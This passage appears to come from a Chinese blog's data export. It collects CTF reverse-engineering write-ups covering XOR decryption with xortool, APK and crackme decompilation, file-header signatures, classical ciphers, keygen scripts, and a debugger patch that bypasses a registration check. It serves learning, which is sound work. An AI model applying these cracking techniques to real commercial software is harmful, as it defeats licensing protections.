新创建的文件名及其路径 for i in range(0,len(txt)): outfile.write(chr(ord(txt[i])^key[i%6])) f.close() //不要忘记关机文件 outfile.close() 运行之后会发现在对应的路径下出现了了名为out的可执行文件然后运行 会出现一个提示由于程序是vs编写的，可能用到了vs里的某些库需要这个动态链接库网上下载一个 保存下来 以后经常会用然后就可以正常代开了 然后就用IDA搜索下字符串就看到flag喽 下面说一下另外一种借用工具的方法工具名称 xortool 工具介绍链接shell中运行命令 python -m pip install xortool 进制安装提示一下：这个工具最好用python 2.+ 运行 然后就要用到python 的 xortool的方法，在python的Script目录下运行xortool，然后放进去下载出来的文件，分析（我已将CM_2.exe放到G:\\python 2.7.13\\Scripts路径下）进入Script目录 常用命令1：python xortool CM_2.exe -c 20 上图列出来密钥的可能长度 常用命令2：python xortool -l 6 -b CM_2.exe //-l后要连着上图推测出来的密钥长度 -b代表爆破 爆破出256种长度为6的可能的密钥然后在Scripts目录下已生成对应文件xortool_out然后用文本查看器打开看看哪个符合pe文件头标准哪个就是正确的爆破结果打开第一个 巧合的是第一个就是正确的那就是它了 拉进IDA 搜索字符串 OK 运用工具，不用分析，简单快速。 下面紧接着再写一道与上题相似的2017问鼎杯线上赛题目“真真假假” 题目下载链接 这道题目只有一个提示——Xor，第一眼知道是异或，也就知道这一个信息。与上题不同的是上题还知道是一个PE文件。之后遇到XOR提示的都可以用小工具xortool先试试看，看能不能得到什么有用的信息打题目放到一个方便操作的目录下 然后敲入命令开始查看可以看出来key的长度最大可能是13给出了长度为13的最大可能的一个key:Good\\tuckToYou因为一方面工具处理存在一定误差，另一方面是出题人有意为之，so猜测正确的key是GoodLuckToYou然后就可以将这个key与整个文件XOR去寻找flag了，脚本下面写，在这里咱们用工具一条路走到黑用长度为13的key与文件进行XOR的爆破，共出现了256种长度为13的key 爆破结果中有55个文本的内容95%以上是可打印字符然后在对应目录下出现一个名为xortool_out的文件打开第一个 感觉是正确的结果但是苦苦思索没什么发现（把大写字母全部改为小写也不好发现什么flag) 然后还是乖乖的写脚本去吧 。。。 明白具体操作后脚本也好写 python 2.7 key = &quot;GoodLuckToYou&quot; f = open(&quot;E:\\\\cipher1&quot;, &quot;rb&quot;) txt = f.read() str = &quot;&quot; for i in range(0,len(txt)): str = str + chr(ord(txt[i])^ord(key[i%13])) print str f.close() python 3.6 key = &quot;GoodLuckToYou&quot; f = open(&apos;E://cipher&apos;,&apos;rb&apos;) txt = f.read() for i in range(len(txt)): print(chr(txt[i]^ord(key[i%13])),end=&quot;&quot;) f.close() 运行结果为： The opening line of the novel famously announces: &quot;It is a truth universally acknowledged, that a single man in possession of a good fortune must be in want of a wife.&quot; This sets marriage as a central subject—and really, a central problem—for the novel generally. Readers are poised to question whether or not these single men are, in fact, in want of a wife, or if such desires are dictated by the &quot;neighbourhood&quot; families and their daughters who require a &quot;good fortune&quot;. Marriage is a complex social activity that takes political economy, and economy more generally, into account. In the case of Charlotte Lucas, for example, the seeming success of her marriage lies in the comfortable economy of their household, while the relationship between Mr and Mrs Bennet serves to illustrate bad marriages based on an initial attraction and surface over substance (economic and psychological). The Bennets&apos; marriage is one such example that the youngest Bennet, Lydia, will come to re-enact with Wickham, and the results are far from felicitous. wdflag{You Are Very Smart}Though the central characters, Elizabeth and Darcy, begin the novel as hostile acquaintances and unlikely friends, they eventually work to understand each other and themselves so that they can marry each other on compatible terms personally, even if their &quot;equal&quot; social status remains fraught. When Elizabeth rejects Darcy&apos;s first proposal, the argument of only marrying when one is in love is introduced. Elizabeth only accepts Darcy&apos;s proposal when she is certain she loves him and her feelings are reciprocated. Austen&apos;s complex sketching of different marriages ultimately allows readers to question what forms of alliance are desirable, especially when it comes to privileging economic, sexual, companionate attraction. 然后flag就在里面 flag{You Are Very Smart} 二、APK_1题目下载链接 APK,也算是第一次真正的做这样安卓题目，前些天聪哥分享了一个反编译APK的工具–Jeb，用Jeb打开双击loginactivity点击右键 选择decompile进行反编译，然后得到反编译后的源码然后就是寻找关键代码了 关键代码如下： private void attemptLogin() { CharSequence v5 = null; if(this.mAuthTask == null) { this.mUsernameView.setError(v5); this.mPasswordView.setError(v5); String v3 = this.mUsernameView.getText().toString(); //信息一 String v2 = this.mPasswordView.getText().toString(); if(TextUtils.isEmpty(((CharSequence)v3))) { this.mUsernameView.setError(this.getString(2131165223)); } else if(!this.isUsernameValid(v3)) { //信息二 this.mUsernameView.setError(this.getString(2131165225)); } if(!this.isPasswordValid(v2, v3)) { //信息三 this.mPasswordView.setError(this.getString(2131165226)); return; } Toast.makeText(this.getApplicationContext(), this.getString(2131165227), 0).show(); } } private boolean isPasswordValid(String arg6, String arg7) { boolean v3 = false; if(arg6.length() != 0) { v3 = &quot;\\n&quot; + arg6.equals(this.re(Base64.encodeToString(arg7.getBytes(), 0))); //Base64加密 然后反转 } return v3; } private boolean isUsernameValid(String arg2) { return arg2.equals(&quot;SycGeek2017&quot;); //明显SycGeek2017就是Username了 } 然后就很简单了，主要就是简单记录下然后倒过来就OK","categories":[],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://leo.dropsec.xyz/tags/Reverse/"}]},{"title":"第八周 密码学相关","slug":"第八周-密码学相关","date":"2017-11-03T12:42:43.000Z","updated":"2018-07-30T13:30:26.317Z","comments":true,"path":"2017/11/03/第八周-密码学相关/","link":"","permalink":"http://leo.dropsec.xyz/2017/11/03/第八周-密码学相关/","excerpt":"这周开始接触密码学，简单总结下。密码学 + 文件头 + reverseMe","text":"这周开始接触密码学，简单总结下。密码学 + 文件头 + reverseMe 一、常见文件类型的文件头根据文件的后缀名识别文件类型并不准确，可以使用文件的头信息进行识别：(文件头信息可以用WinHex得到) JPEG (jpg)，文件头：FFD8FFE1 PNG (png)，文件头：89504E47 GIF (gif)，文件头：47494638 ZIP Archive (zip)，文件头：504B0304 RAR Archive (rar)，文件头：52617221 AVI (avi)，文件头：41564920 pyc 文件头：03F30D0A TIFF (tif)，文件头：49492A00 Windows Bitmap (bmp)，文件头：424D CAD (dwg)，文件头：41433130 Adobe Photoshop (psd)，文件头：38425053 Rich Text Format (rtf)，文件头：7B5C727466 XML (xml)，文件头：3C3F786D6C HTML (html)，文件头：68746D6C3E Email [thorough only] (eml)，文件头：44656C69766572792D646174653A Outlook Express (dbx)，文件头：CFAD12FEC5FD746F Outlook (pst)，文件头：2142444E MS Word/Excel (xls.or.doc)，文件头：D0CF11E0 MS Access (mdb)，文件头：5374616E64617264204A WordPerfect (wpd)，文件头：FF575043 Postscript (eps.or.ps)，文件头：252150532D41646F6265 Adobe Acrobat (pdf)，文件头：255044462D312E Quicken (qdf)，文件头：AC9EBD8F Windows Password (pwl)，文件头：E3828596 Wave (wav)，文件头：57415645 Real Audio (ram)，文件头：2E7261FD Real Media (rm)，文件头：2E524D46 MPEG (mpg)，文件头：000001BA MPEG (mpg)，文件头：000001B3 Quicktime (mov)，文件头：6D6F6F76 Windows Media (asf)，文件头：3026B2758E66CF11 MIDI (mid)，文件头：4D546864 参考：http://fuliang.iteye.com/blog/769680 二、常见（古典）密码简述摩尔斯电码（摩斯密码，Morse code）用两种“符号”用来表示字元：划（—）和点（·） 用摩斯密码表示字母 用摩斯密码表示数字 用摩斯密码表示标点符号 摩尔斯电码在线解密 凯撒密码凯撒密码加密就是把原字母按照字母表顺序向后移1-26位，例如：ABCDEF集体向后移三位结果就是defghi 再例如：byebye后移5位就是gdjgdj 凯撒在线加密与解密 培根密码培根密码本质上用二进制数设计的，没有用通常的0和1来表示，而是采用a和b 第一种方式 A aaaaa B aaaab C aaaba D aaabb E aabaa F aabab G aabba H aabbb I abaaa J abaab K ababa L ababb M abbaa N abbab O abbba P abbbb Q baaaa R baaab S baaba T baabb U babaa V babab W babba X babbb Y bbaaa Z bbaab 第二种方式 a AAAAA g AABBA n ABBAA t BAABA b AAAAB h AABBB o ABBAB u-v BAABB c AAABA i-j ABAAA p ABBBA w BABAA d AAABB k ABAAB q ABBBB x BABAB e AABAA l ABABA r BAAAA y BABBA f AABAB m ABABB s BAAAB z BABBB 加密者需使用两种不同字体。准备好一篇包含相同AB字数的假信息后，即两种字体分别代表A型和B型。然后假信息中的每个字母按字体来决定其代表“A”还是“B”。 如：密文是LOVE，用“随意选取句子和文”加密，得到结果就是“SuLyi XuanQ uJuZi HEwEN”（这里用小写代表b） 培根密码在线加解密 栅栏密码所谓栅栏密码，就是把要加密的明文分成N个一组，然后把每组的第1个字连起来，形成一段无规律的话。 不过栅栏密码本身有一个潜规则，就是组成栅栏的字母一般不会太多。（一般不超过30个，也就是一、两句话） 一般比较常见的是2栏的栅栏密码。 比如明文：THERE IS A CIPHER 去掉空格后变为：THEREISACIPHER 两个一组，得到：TH ER EI SA CI PH ER 先取出第一个字母：TEESCPE 再取出第二个字母：HRIAIHR 连在一起就是：TEESCPEHRIAIHR (解密步骤与此相反） 栅栏密码加密解密 密码种类介绍补充一密码种类介绍补充二 下面接着写下分享会的一道reverseMe 题目题目下载链接 因为不确定文件类型（惯用IDA打开看看，发现风格与以往不同），用上面所讲的方法来确定类型 首先拉进WinHex，然后拉到最下面，发现文件头是 FFD8FFE1 所以判断出它是jpg格式的图片然后就可以去把他变为一张可视的图片喽，具体实现如下 open(&quot;E:\\\\flag.jpg&quot;,&quot;wb&quot;).write(open(&quot;E:\\\\reverseMe&quot;,&quot;rb&quot;).read()[::-1]) 注意路径的书写，然后运行后可以在此目录下得到名为flag.jpg的图片。 发现是镜像flag，可以用手机或镜子辅助看到正常显示的内容在这里分享一个小在线工具在线反转、旋转图片然后经过操作变成这个样子喽","categories":[],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://leo.dropsec.xyz/tags/Reverse/"}]},{"title":"第七周分享会题目 wp","slug":"第七周分享会题目-wp","date":"2017-10-26T07:24:20.000Z","updated":"2018-07-30T13:28:50.423Z","comments":true,"path":"2017/10/26/第七周分享会题目-wp/","link":"","permalink":"http://leo.dropsec.xyz/2017/10/26/第七周分享会题目-wp/","excerpt":"第七周的题目。更换了一个IDA。F5大法好。是真强大。好久都没用OD了，一个F5全部解决。","text":"第七周的题目。更换了一个IDA。F5大法好。是真强大。好久都没用OD了，一个F5全部解决。 一、Linux_1题目下载链接 本题也超级简单，关键在于找到关键算法F5出来的伪码如下 __int64 sub_4009AE() { unsigned __int64 v0; // rax@2 unsigned __int64 v1; // rax@4 unsigned __int64 v2; // rax@6 unsigned __int64 v3; // rax@7 __int64 v4; // rdx@10 __int64 result; // rax@10 char v6; // [sp+10h] [bp-110h]@2 __int64 v7; // [sp+118h] [bp-8h]@1 v7 = *MK_FP(__FS__, 40LL); sub_40FF80(&quot;===============Welcome to Linux!===============&quot;); sub_40FF80(&quot;Maybe it&apos;s strange, but it&apos;s absolutely simple.&quot;); sub_40FF80(&quot;Now guess the password to prove your ability : &quot;); sub_40F580((unsigned __int64)&quot; -&gt; &quot;); while ( 1 ) { while ( 1 ) { sub_40F6B0((unsigned __int64)&quot;%s&quot;); LODWORD(v0) = sub_423D10(&amp;v6, &amp;v6); if ( v0 &gt; 0xF ) sub_40F580((unsigned __int64)&quot;The password is too long! \\n -&gt; &quot;); LODWORD(v1) = sub_423D10(&amp;v6, &amp;v6); if ( v1 &lt; 0xF ) sub_40F580((unsigned __int64)&quot;The password is too short! \\n -&gt; &quot;); LODWORD(v2) = sub_423D10(&amp;v6, &amp;v6); if ( v2 &lt;= 0xF ) { LODWORD(v3) = sub_423D10(&amp;v6, &amp;v6); if ( v3 &gt;= 0xF ) break; } } if ( (unsigned int)sub_400B28((__int64)&amp;v6) ) //关键函数 break; sub_40F580((unsigned __int64)&quot;check failed! \\n -&gt; &quot;); } sub_40FF80(&quot;That&apos;s it! :)&quot;); sub_40F580((unsigned __int64)&quot;flag is \\&quot;SYC{ }\\&quot;\\n&quot;); result = 0LL; if ( *MK_FP(__FS__, 40LL) != v7 ) sub_443140(&quot;flag is \\&quot;SYC{ }\\&quot;\\n&quot;, &amp;v6, v4, *MK_FP(__FS__, 40LL) ^ v7); return result; } 跟进关键函数 __int64 __fastcall sub_400B28(__int64 a1) { __int64 result; // rax@6 if ( *(_BYTE *)a1 == 76 &amp;&amp; *(_BYTE *)(a1 + 1) == 49 &amp;&amp; *(_BYTE *)(a1 + 2) == 110 &amp;&amp; *(_BYTE *)(a1 + 3) == 117 &amp;&amp; *(_BYTE *)(a1 + 4) == 120 ) { if ( *(_BYTE *)(a1 + 14) == 101 &amp;&amp; *(_BYTE *)(a1 + 13) == 108 &amp;&amp; *(_BYTE *)(a1 + 12) == 112 &amp;&amp; *(_BYTE *)(a1 + 9) == 53 &amp;&amp; *(_BYTE *)(a1 + 8) == 95 ) { result = *(_BYTE *)(a1 + 10) == 49 &amp;&amp; *(_BYTE *)(a1 + 11) == 109 &amp;&amp; *(_BYTE *)(a1 + 7) == 115 &amp;&amp; *(_BYTE *)(a1 + 6) == *(_BYTE *)(a1 + 1) &amp;&amp; *(_BYTE *)(a1 + 5) == *(_BYTE *)(a1 + 8); } else { result = 0LL; } } else { result = 0LL; } return result; } 很简单，注意数组元素顺序 a=[76,49,110,117,120,95,49,115,95,53,49,109,112,108,101] for i in a: print(chr(i), end=&quot;&quot;) 运行结果：L1nux_1s_51mple 伪码中看到 sub_40F580((unsigned __int64)”flag is \\”SYC{ }\\”\\n”);所以提交的时候加上格式SYC{ }之后在提交flag之前，要注意这个细节。不要犯这种低级错误。 二、CrackMe1题目下载链接 F5出来的 int __cdecl main(int argc, const char **argv, const char **envp) { int result; // eax@2 int v4; // [sp+0h] [bp-7D0h]@1 sub_4011BA((int)aCanYouGuessThe, v4); gets((char *)&amp;v4); if ( sub_401060((const char *)&amp;v4) ) //关键函数 { sub_4011BA((int)aGoodTheKeyIsYo, v4); //字符提示 result = 0; } else { sub_4011BA((int)aYouDonTGuessIt, v4); result = 0; } return result; } 跟进关键函数 signed int __cdecl sub_401060(const char *a1) { unsigned int v1; // edx@2 unsigned int v2; // edx@4 int v3; // edx@6 int v5; // [sp+Ch] [bp-10h]@1 int v6; // [sp+10h] [bp-Ch]@1 int v7; // [sp+14h] [bp-8h]@1 __int16 v8; // [sp+18h] [bp-4h]@1 char v9; // [sp+1Ah] [bp-2h]@1 v5 = dword_40708C; v6 = dword_407090; v8 = word_407098; v9 = byte_40709A; v7 = dword_407094; if ( strlen(a1) == strlen((const char *)&amp;v5) ) { v1 = 0; if ( strlen(a1) != 0 ) { do a1[v1++] ^= 0x20u; //处理一 对a1异或操作 while ( v1 &lt; strlen(a1) ); } v2 = 0; if ( strlen((const char *)&amp;v5) != 0 ) { do *((_BYTE *)&amp;v5 + v2++) -= 5; //处理二 对v5 -5 操作 while ( v2 &lt; strlen((const char *)&amp;v5) ); } v3 = 0; if ( strlen((const char *)&amp;v5) == 0 ) return 1; while ( *((_BYTE *)&amp;v5 + v3 + a1 - (const char *)&amp;v5) == *((_BYTE *)&amp;v5 + v3) ) //这个语句反编译出错（提醒我们不要太相信F5，他也会出先错误滴），不过这个语句不涉及算法操作。 { if ( ++v3 &gt;= strlen((const char *)&amp;v5) ) return 1; } } return 0; } 先得到数组v5的数据v5=[0x68,0x57,0x19,0x48,0x50,0x6e,0x58,0x78,0x54,0x6a,0x19,0x58,0x5e,0x6]然后开始逆向出脚本 v5=[0x68,0x57,0x19,0x48,0x50,0x6e,0x58,0x78,0x54,0x6a,0x19,0x58,0x5e,0x6] for i in range(len(v5)): v5[i]=v5[i]-0x5 # 注意不要逆成 +5 print(chr(v5[i]^0x20),end=&quot;&quot;) 运行结果：Cr4ckIsSoE4sy! 总结：理清运算操作的对象，再敲脚本。（要不还一直自以为是的认为自己是对的）抓住关键语句，忽略次要语句。（宁信IDA，不如无IDA） 三、cosh.3题目下载链接 同样，拉进IDA，和之前不一样的是，字符串搜索后，交叉引用后来到调用段，发现有些调用是红色的（正常是黑色） 这里需要多一个操作，把红色的调用段解封一下。具体做法是找到连续红色调用段最上面的红色调用段，选中、右击，选择create function。然后会发现突然解封出一些黑色代码段。然后往下翻，把能看到的还是红色的调用段继续解封。直到把字符提示段对应的红色调用段这部分解封完毕即可。然后F5，就看到反编译出来的关键伪码了 int __thiscall sub_4014B0(CWnd *this) { signed int v1; // ecx@3 _BYTE *v2; // eax@3 signed int v3; // ecx@5 _BYTE *v4; // eax@5 _BYTE *v5; // eax@7 _BYTE *v6; // edx@7 CWnd *v8; // [sp+Ch] [bp-20h]@1 _BYTE *v9; // [sp+10h] [bp-1Ch]@1 int v10; // [sp+14h] [bp-18h]@2 int v11; // [sp+18h] [bp-14h]@1 _BYTE *v12; // [sp+1Ch] [bp-10h]@1 int v13; // [sp+28h] [bp-4h]@1 v8 = this; CString::CString(&amp;v9); v13 = 0; CString::CString(&amp;v12); LOBYTE(v13) = 1; v11 = CWnd::GetWindowTextLengthA((CWnd *)((char *)v8 + 160)); //获取文本长度 if ( v11 &gt; 5 ) { v10 = CWnd::GetWindowTextLengthA((CWnd *)((char *)v8 + 96)); //获取文本长度 if ( v10 &gt; 5 ) { CWnd::GetWindowTextA((CWnd *)((char *)v8 + 160), (CWnd *)((char *)v8 + 224)); //获取文本（name)内容 CWnd::GetWindowTextA((CWnd *)((char *)v8 + 96), (CWnd *)((char *)v8 + 228)); //获取文本（serial)内容 CString::operator=(&amp;v9, (char *)v8 + 224); //$v9=输入的name CString::operator=(&amp;v12, (char *)v8 + 228); //$v12=输入的serial v1 = 1; v2 = v9; do *v2++ ^= v1++; //关键处 while ( *v2 ); v3 = 10; v4 = v12; do *v4++ ^= v3++; while ( *v4 ); v5 = v9; v6 = v12; while ( *v5 == *v6 ) { ++v5; ++v6; if ( !*v5 ) { CWnd::MessageBoxA(v8, aWellDoneCracke, aYouDidIt, 0); goto LABEL_12; } } } } CWnd::MessageBoxA(v8, aOneOfTheDetail, aError, 0); LABEL_12: Sleep(0x64u); LOBYTE(v13) = 0; CString::~CString((CString *)&amp;v12); v13 = -1; return CString::~CString((CString *)&amp;v9); } 关键算法处理很简单脚本如下（例name=dropsec) name=&apos;dropsec&apos; a = 1 b = 10 for i in range(len(name)): print(chr(((ord(name[i])^a)^b)),end=&quot;&quot;) a=a+1 b=b+1 运行结果:o{`yxlt 这个题是一个注册机，答案不限制，这里name=dropsec而已。","categories":[],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://leo.dropsec.xyz/tags/Reverse/"}]},{"title":"第六周分享会题目 wp","slug":"第六周分享会题目-wp","date":"2017-10-25T13:12:48.000Z","updated":"2018-07-30T13:28:35.693Z","comments":true,"path":"2017/10/25/第六周分享会题目-wp/","link":"","permalink":"http://leo.dropsec.xyz/2017/10/25/第六周分享会题目-wp/","excerpt":"第六周,从本周开始只上传一些能总结出东西的题目，以节省时间的同时总结经验。","text":"第六周,从本周开始只上传一些能总结出东西的题目，以节省时间的同时总结经验。 一、Easy_ELF题目下载链接 flag是：L1NUX 二、喵题目下载链接 IDA中关键算法的伪码如下： int __cdecl main(int argc, const char **argv, const char **envp) { int v4; // [sp+14h] [bp-34h]@1 char v5; // [sp+18h] [bp-30h]@1 char v6; // [sp+19h] [bp-2Fh]@1 char v7; // [sp+1Ah] [bp-2Eh]@1 char v8; // [sp+1Bh] [bp-2Dh]@1 char v9; // [sp+1Ch] [bp-2Ch]@1 char v10; // [sp+1Dh] [bp-2Bh]@1 char v11; // [sp+1Eh] [bp-2Ah]@1 char v12; // [sp+1Fh] [bp-29h]@1 char v13; // [sp+20h] [bp-28h]@1 int v14; // [sp+28h] [bp-20h]@1 int v15; // [sp+2Ch] [bp-1Ch]@1 int v16; // [sp+3Ch] [bp-Ch]@1 __main(); v14 = 0; memset(&amp;v15, 0, 0x10u); memset(&amp;v4, 0, 0x14u); v4 = -404624154; // 注意是小段存储 十六进制观察数据 v5 = -70; v6 = -12; v7 = -27; v8 = -13; v9 = -12; v10 = -12; v11 = -27; v12 = -13; v13 = -12; v16 = 0; puts(&quot;喵?&quot;); scanf(&quot;%s&quot;, &amp;v14); //&amp;v14是输入的flag LOBYTE(v16) = 0; while ( *((_BYTE *)&amp;v14 + v16) ) *((_BYTE *)&amp;v14 + v16++) |= 0x80u; //遍历flag进行或处理，结果给&amp;v14 if ( !strcmp((const char *)&amp;v14, (const char *)&amp;v4) ) //&amp;v14 与 &amp;v4比较 printf(&quot;good&quot;); else printf(&quot;wrong&quot;); return 0; } 先写出v4数组的值 由于是小段存储 需要先把v4变成十六进制，然后手动得到十进制数（直接右击会出错） 所以v4 = [230,236,225,231,186,244,229,243,244,244,229,243,244]又因为其进行的是或（|）运算，是不可逆的，所以只能进行爆破得到flag又因为flag一般都是可打印字符，所以爆破范围是(32，126] (也可以从1开始）下面是详细脚本： v4 = [230,236,225,231,186,244,229,243,244,244,229,243,244] for i in v4: for j in range(32,127): if ((j | 128) == i): print(chr(j), end=&quot;&quot;) 结果是：flag:testtest 总结：此题在搞懂算法后，需要进行爆破。小段存储，不能直接右击数据得到其对应十进制，这样会出错，应手动得到其对应的十进制。 三、reverse题目下载链接 IDA关键算法如下： __int64 __fastcall sub_40082A(int a1, __int64 a2) { __int64 result; // rax@3 __int64 v3; // rdx@7 char v4; // [sp+10h] [bp-10h]@4 __int64 v5; // [sp+18h] [bp-8h]@1 v5 = *MK_FP(__FS__, 40LL); if ( a1 != 3 &amp;&amp; (unsigned int)sub_400646(a2) ) //算法一 { puts(&quot;Keep thinking!&quot;); result = 0LL; } else { printf(&quot;Please input your password(5 words):&quot;, a2); // 5 words __isoc99_scanf(&quot;%5s&quot;, &amp;v4); if ( sub_400755(&amp;v4) == 1 ) //算法二 { printf(&quot;Good Job!\\nThe password:%s&quot;, &amp;v4); result = 0LL; } else { puts(&quot;Wrong!&quot;); result = 0LL; } } v3 = *MK_FP(__FS__, 40LL) ^ v5; return result; } 先跟进去算法一看看： signed __int64 __fastcall sub_400646(__int64 a1) { signed __int64 result; // rax@3 __int64 v2; // rcx@12 signed int i; // [sp+18h] [bp-48h]@1 signed int j; // [sp+1Ch] [bp-44h]@6 int v5; // [sp+20h] [bp-40h]@1 int v6; // [sp+24h] [bp-3Ch]@1 int v7; // [sp+28h] [bp-38h]@1 int v8; // [sp+2Ch] [bp-34h]@1 int v9; // [sp+30h] [bp-30h]@1 int v10; // [sp+40h] [bp-20h]@1 int v11; // [sp+44h] [bp-1Ch]@1 int v12; // [sp+48h] [bp-18h]@1 int v13; // [sp+4Ch] [bp-14h]@1 int v14; // [sp+50h] [bp-10h]@1 __int64 v15; // [sp+58h] [bp-8h]@1 v15 = *MK_FP(__FS__, 40LL); puts(*(const char **)(a1 + 8)); v5 = 108; v6 = 49; v7 = 110; v8 = 117; v9 = 120; v10 = 99; v11 = 114; v12 = 97; v13 = 99; v14 = 107; for ( i = 0; i &lt;= 4; ++i ) { if ( *(_BYTE *)(*(_QWORD *)(a1 + 8) + i) != *(&amp;v5 + i) ) { result = 1LL; goto LABEL_12; } } for ( j = 0; j &lt;= 4; ++j ) { if ( *(_BYTE *)(*(_QWORD *)(a1 + 16) + j) != *(&amp;v10 + j) ) { result = 1LL; goto LABEL_12; } } result = 0LL; LABEL_12: v2 = *MK_FP(__FS__, 40LL) ^ v15; return result; } 算法很简单，一一对应就出来了 a=[108,49,110,117,120,99,114,97,99,107] for i in a: print(chr(i), end=&quot;&quot;) 运行结果：l1nuxcrack 然后跟进去算法二 __int64 __usercall sub_400755@&lt;rax&gt;(__int64 a1@&lt;rax&gt;) { __int64 result; // rax@6 if ( *(_BYTE *)a1 + *(_BYTE *)(a1 + 4) != 106 || *(_BYTE *)a1 != 73 ) { result = 0LL; } else if ( *(_BYTE *)(a1 + 1) == 76 ) { result = *(_BYTE *)(a1 + 2) + *(_BYTE *)(a1 + 3) == 137 &amp;&amp; *(_BYTE *)(a1 + 3) == 70; } else { result = 0LL; } return result; } 算法也很简单，通过加减运算就出来了 a[0]=73 a[4]=33 a[1]=76 a[3]=70 a[2]=67即a=[73,76,67,70,33] a=[73,76,67,70,33] for i in a: print(chr(i), end=&quot;&quot;) 运行结果：ILCF! 综合连接起来，flag为：l1nuxcrackILCF!（正式比赛的话，flag都会有一些格式要求，比如这个题的要求是这样的： so,提交的flag应为： flag{l1nux_crack_ILCF!} 总结：有些题目的flag是由两个或多个地方的算法共同作用得到的。注意提交flag的形式。","categories":[],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://leo.dropsec.xyz/tags/Reverse/"}]},{"title":"第五周分享会题目 wp","slug":"第五周分享会题目-wp","date":"2017-10-14T05:07:15.000Z","updated":"2018-07-30T13:28:18.581Z","comments":true,"path":"2017/10/14/第五周分享会题目-wp/","link":"","permalink":"http://leo.dropsec.xyz/2017/10/14/第五周分享会题目-wp/","excerpt":"这三道题目是本周三分享会上给的，假期缘故，就把这三道题目归为第五周分享会题目吧。","text":"这三道题目是本周三分享会上给的，假期缘故，就把这三道题目归为第五周分享会题目吧。 一.CM_3题目下载链接 这个题是寻找flag,输入正确的注册码会得到flag.两种思路：1.根据算法找到正确注册码，进而得到flag2.爆破，直接去找flag. 先加载到IDA看看算法，发现比较复杂，正面求解注册码会比较费事。这个时候就寻思用简单的方法了。加载到OD，去爆破跟flag先找到字符在上边适当语句上下断点重新加载，F9,F8单步到输入注册码，随便输一个单步到跳转处修改标志位为1 使其跳转然后接着进入call然后运行到字符提示出就会看到flag然后继续单步OK了 然后在IDA算法里会发现，在判断注册码后有一个生成flag的函数然后进去瞅瞅 int sub_45BFF0() { int v0; // edx@4 int v1; // ST04_4@4 int v2; // ecx@4 char v4; // [sp+Ch] [bp-134h]@1 int v5; // [sp+10h] [bp-130h]@4 int i; // [sp+DCh] [bp-64h]@1 char v7; // [sp+EBh] [bp-55h]@3 int v8; // [sp+F4h] [bp-4Ch]@1 int v9; // [sp+F8h] [bp-48h]@1 int v10; // [sp+FCh] [bp-44h]@1 int v11; // [sp+100h] [bp-40h]@1 int v12; // [sp+104h] [bp-3Ch]@1 int v13; // [sp+108h] [bp-38h]@1 int v14; // [sp+10Ch] [bp-34h]@1 int v15; // [sp+110h] [bp-30h]@1 int v16; // [sp+11Ch] [bp-24h]@1 int v17; // [sp+120h] [bp-20h]@1 int v18; // [sp+124h] [bp-1Ch]@1 int v19; // [sp+128h] [bp-18h]@1 int v20; // [sp+12Ch] [bp-14h]@1 int v21; // [sp+130h] [bp-10h]@1 int v22; // [sp+134h] [bp-Ch]@1 int v23; // [sp+138h] [bp-8h]@1 int savedregs; // [sp+140h] [bp+0h]@4 memset(&amp;v4, 0xCCu, 0x134u); v16 = 7; v17 = 3; v18 = 1; v19 = 8; v20 = 7; v21 = 2; v22 = 3; v23 = 2; v8 = 18; v9 = 19; v10 = 20; v11 = 1; v12 = 15; v13 = 20; v14 = 16; v15 = 11; for ( i = 0; i &lt; 8; ++i ) { v7 = byte_52E000[*(&amp;v16 + i)]; byte_52E000[*(&amp;v16 + i)] = byte_52E000[*(&amp;v8 + i)]; byte_52E000[*(&amp;v8 + i)] = v7; } v5 = 21; byte_52E000[21] = 0; sub_458430(&quot;SYC{%s}\\n&quot;); v1 = v0; sub_457841(&amp;savedregs, &amp;dword_45C134); return sub_456685(v2, v1); } 这就是了然后点进去看看基地址byte_52E000是什么分析算法就可以写出注册机了 a = &quot;01!l...uo__p5_UOsfseD&quot; b = [7,3,1,8,7,2,3,2] c = [18,19,20,1,15,20,16,11] a = list(a) t = &quot;&quot; for i in range(8): t = a[b[i]] a[b[i]] = a[c[i]] a[c[i]] = t str = &quot;&quot;.join(a) print(a) print(str) 运行结果： [&apos;0&apos;, &apos;o&apos;, &apos;p&apos;, &apos;s&apos;, &apos;.&apos;, &apos;.&apos;, &apos;.&apos;, &apos;O&apos;, &apos;D&apos;, &apos;_&apos;, &apos;_&apos;, &apos;1&apos;, &apos;5&apos;, &apos;_&apos;, &apos;U&apos;, &apos;s&apos;, &apos;e&apos;, &apos;f&apos;, &apos;u&apos;, &apos;l&apos;, &apos;!&apos;] 0ops...OD__15_Useful! 二.cm1题目下载链接 这好像是一个linux小程序，不能运行（也可以说目前的我不知道怎么运行linux程序）。然后直接IDA打开，按照老套路来看看能不能找到关键算法，然后就找到了 int __cdecl main(int argc, const char **argv, const char **envp) { int result; // eax@2 char s; // [sp+10h] [bp-30h]@1 int v5; // [sp+38h] [bp-8h]@3 int v6; // [sp+3Ch] [bp-4h]@1 printf(&quot;Let me cheack your flag:&quot;, argv, argv); gets(&amp;s); //输入flag v6 = strlen(&amp;s); //v6为flag长度 if ( (unsigned int)cheack_func(&amp;s) ) //进入check_func发现v6==22进入if语句 { v5 = decode1((__int64)&amp;s, v6); //核心算法 judge_func(v5); //符合条件则输出成功找到 result = 0; } else { puts(&quot;Try again~&quot;); result = 0; } return result; } 进入check_func看下 __int64 __fastcall decode1(__int64 a1, int a2) { unsigned int v3; // [sp+14h] [bp-8h]@1 int i; // [sp+18h] [bp-4h]@1 v3 = 0; for ( i = 0; i &lt; a2; ++i ) { if ( (i ^ *(_BYTE *)(i + a1)) != compare[(signed __int64)i] ) return 0LL; ++v3; } return v3; } 算法不是太复杂，容易写出注册机。先来看看compare的数据 (注意区分什么时候是倒的，什么时候是正的）然后就是脚本了 c = &quot;E`1z[F1fkbUFiRFnftMUa{&quot; for i in range(len(c)): print(chr(i^ord(c[i])),end=&quot;&quot;) 运行结果：Ea3y_C7ack_Me_Have_Fun 三、RE50题目下载链接 （2017.10.24 补题解）这道题滞留了好多天，刚才算是窍通了一下…先来运行下程序寻找flag 无壳 C/C++编写先用IDA看看能不能看出求解算法shift+f12查找字符串，进而找到关键算法的伪码 int sub_401130() { char v1; // [sp+0h] [bp-10h]@1 sub_402702(&quot;Do you know flag?\\n&quot;); ((void (__thiscall *)(char *))loc_4010A0)(&amp;v1); //&amp;v1 输入的flag if ( 